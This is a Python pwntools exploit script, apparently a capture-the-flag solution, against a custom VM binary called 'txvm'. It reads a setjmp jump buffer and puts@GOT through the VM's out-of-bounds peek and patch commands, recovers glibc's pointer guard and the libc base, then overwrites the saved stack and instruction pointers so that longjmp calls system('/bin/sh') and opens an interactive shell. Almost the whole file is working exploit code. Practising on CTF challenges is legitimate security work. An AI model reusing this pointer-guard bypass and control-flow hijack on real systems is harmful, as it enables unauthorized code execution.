#!/usr/bin/env python3
import os
from pwn import *

BIN_PATH  = os.environ.get("BIN", "./txvm_patched")
LIBC_PATH = os.environ.get("LIBC", "./libc.so.6")
LD_PATH   = os.environ.get("LD", "./ld-2.39.so")

if not os.path.exists(LIBC_PATH) and os.path.exists("./libc.so(6).6"):
    LIBC_PATH = "./libc.so(6).6"

elf  = ELF(BIN_PATH)
libc = ELF(LIBC_PATH)
ld   = ELF(LD_PATH)

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "info"

DOCKER_PORT = 1337
REMOTE_NC_CMD = "nc HOST PORT"

PROMPT = b"vm> "
MASK = (1 << 64) - 1

S = elf.symbols["S"]
JMPBUF = S + 0x8
VM_MAIN = S + 0x158

OFF_JB_START = JMPBUF - VM_MAIN
OFF_JB_RBP   = (JMPBUF + 0x08) - VM_MAIN
OFF_JB_R14   = (JMPBUF + 0x20) - VM_MAIN
OFF_JB_RSP   = (JMPBUF + 0x30) - VM_MAIN
OFF_JB_RIP   = (JMPBUF + 0x38) - VM_MAIN
OFF_PUTS_GOT = elf.got["puts"] - VM_MAIN


def rol(x, n):
    return ((x << n) & MASK) | (x >> (64 - n))


def ror(x, n):
    return ((x >> n) | (x << (64 - n))) & MASK


def mangle_ptr(ptr, guard):
    return rol((ptr ^ guard) & MASK, 17)


def demangle_ptr(ptr, guard):
    return ror(ptr, 17) ^ guard


def start():
    root = os.path.dirname(os.path.abspath(elf.path)) or "."

    if args.GDB:
        return gdb.debug(
            elf.path,
            cwd=root,
            gdbscript="""
set follow-fork-mode child
c
"""
        )

    if args.LOCAL:
        return process(elf.path, cwd=root)

    if args.LD:
        return process(
            [ld.path, "--library-path", root, "--preload", libc.path, elf.path],
            cwd=root
        )

    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)

    _, host, port = REMOTE_NC_CMD.split()
    return remote(host, int(port))


io = start()
io.recvuntil(PROMPT)


def cmd(s):
    if isinstance(s, str):
        s = s.encode()

    io.sendline(s)
    return io.recvuntil(PROMPT)


def peek8(off):
    io.sendline(f"peek8 r0, {off}".encode())

    line = io.recvline().strip()
    io.recvuntil(PROMPT)

    try:
        return int(line, 16)
    except ValueError:
        log.failure(f"bad peek8 output: {line!r}")
        raise


def poke8(off, val):
    cmd(f"patch8 r0, {off} = 0x{val & 0xff:02x}")


def leak_qword(name, off):
    value = u64(bytes(peek8(off + i) for i in range(8)))
    log.success(f"{name}: {value:#x}")
    return value


def write_qword(name, off, value):
    log.info(f"write {name}: {value:#x}")
    for i, b in enumerate(p64(value)):
        poke8(off + i, b)


def main():
    rbp_mangled = leak_qword("jmpbuf.rbp", OFF_JB_RBP)
    saved_r14   = leak_qword("jmpbuf.r14", OFF_JB_R14)
    rsp_mangled = leak_qword("jmpbuf.rsp", OFF_JB_RSP)
    puts_leak   = leak_qword("puts@got", OFF_PUTS_GOT)

    real_rbp = saved_r14 + 0xa0
    guard = ror(rbp_mangled, 17) ^ real_rbp
    saved_rsp = demangle_ptr(rsp_mangled, guard)

    libc.address = puts_leak - libc.sym["puts"]

    log.success(f"real rbp:      {real_rbp:#x}")
    log.success(f"saved rsp:     {saved_rsp:#x}")
    log.success(f"pointer guard: {guard:#x}")
    log.success(f"libc base:     {libc.address:#x}")
    log.success(f"system:        {libc.sym['system']:#x}")

    write_qword("'/bin/sh'", OFF_JB_START, u64(b"/bin/sh\x00"))
    write_qword("jmpbuf.rsp", OFF_JB_RSP, mangle_ptr(saved_rsp + 8, guard))
    write_qword("jmpbuf.rip", OFF_JB_RIP, mangle_ptr(libc.sym["system"], guard))

    cmd("begin transaction")

    log.info("triggering longjmp")
    io.sendline(b"peek8 r0, 8")

    io.interactive()


if __name__ == "__main__":
    main()